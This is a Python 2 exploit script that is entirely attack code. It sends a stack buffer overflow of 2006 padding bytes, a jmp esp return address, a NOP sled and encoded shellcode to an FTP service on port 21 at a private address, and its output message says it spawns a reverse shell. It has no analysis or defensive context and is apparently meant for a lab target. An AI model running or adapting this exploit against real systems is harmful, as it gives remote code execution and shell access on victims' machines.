#!/usr/bin/python2

import socket

host = "192.168.70.133"
port = 21
offset = "A" * 2006
return_address = "\x08\x98\xa5\x75" # jmp esp 75a59808
nop_sled = "\x90" * 20
shellcode = (
"\xda\xd7\xbb\x4a\x96\xc9\xcf\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x5f\x17\x83\xc7\x04\x03\x15\x85\x2b\x3a\x55\x41\x29"
"\xc5\xa5\x92\x4e\x4f\x40\xa3\x4e\x2b\x01\x94\x7e\x3f\x47\x19"
"\xf4\x6d\x73\xaa\x78\xba\x74\x1b\x36\x9c\xbb\x9c\x6b\xdc\xda"
"\x1e\x76\x31\x3c\x1e\xb9\x44\x3d\x67\xa4\xa5\x6f\x30\xa2\x18"
"\x9f\x35\xfe\xa0\x14\x05\xee\xa0\xc9\xde\x11\x80\x5c\x54\x48"
"\x02\x5f\xb9\xe0\x0b\x47\xde\xcd\xc2\xfc\x14\xb9\xd4\xd4\x64"
"\x42\x7a\x19\x49\xb1\x82\x5e\x6e\x2a\xf1\x96\x8c\xd7\x02\x6d"
"\xee\x03\x86\x75\x48\xc7\x30\x51\x68\x04\xa6\x12\x66\xe1\xac"
"\x7c\x6b\xf4\x61\xf7\x97\x7d\x84\xd7\x11\xc5\xa3\xf3\x7a\x9d"
"\xca\xa2\x26\x70\xf2\xb4\x88\x2d\x56\xbf\x25\x39\xeb\xe2\x21"
"\x8e\xc6\x1c\xb2\x98\x51\x6f\x80\x07\xca\xe7\xa8\xc0\xd4\xf0"
"\xcf\xfa\xa1\x6e\x2e\x05\xd2\xa7\xf5\x51\x82\xdf\xdc\xd9\x49"
"\x1f\xe0\x0f\xdd\x4f\x4e\xe0\x9e\x3f\x2e\x50\x77\x55\xa1\x8f"
"\x67\x56\x6b\xb8\x02\xad\xfc\x07\x7a\xeb\x7f\xef\x79\xf3\x6e"
"\xac\xf4\x15\xfa\x5c\x51\x8e\x93\xc5\xf8\x44\x05\x09\xd7\x21"
"\x05\x81\xd4\xd6\xc8\x62\x90\xc4\xbd\x82\xef\xb6\x68\x9c\xc5"
"\xde\xf7\x0f\x82\x1e\x71\x2c\x1d\x49\xd6\x82\x54\x1f\xca\xbd"
"\xce\x3d\x17\x5b\x28\x85\xcc\x98\xb7\x04\x80\xa5\x93\x16\x5c"
"\x25\x98\x42\x30\x70\x76\x3c\xf6\x2a\x38\x96\xa0\x81\x92\x7e"
"\x34\xea\x24\xf8\x39\x27\xd3\xe4\x88\x9e\xa2\x1b\x24\x77\x23"
"\x64\x58\xe7\xcc\xbf\xd8\x17\x87\x9d\x49\xb0\x4e\x74\xc8\xdd"
"\x70\xa3\x0f\xd8\xf2\x41\xf0\x1f\xea\x20\xf5\x64\xac\xd9\x87"
"\xf5\x59\xdd\x34\xf5\x4b"
)

payload = offset + return_address + nop_sled + shellcode

try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        print("[+] Sending Payloads")
        s.send(bytes(payload))
        print("[+] Reverse Shell Spawned isn't it?")
except:
        print("Host is unreachable")
        sys.exit()
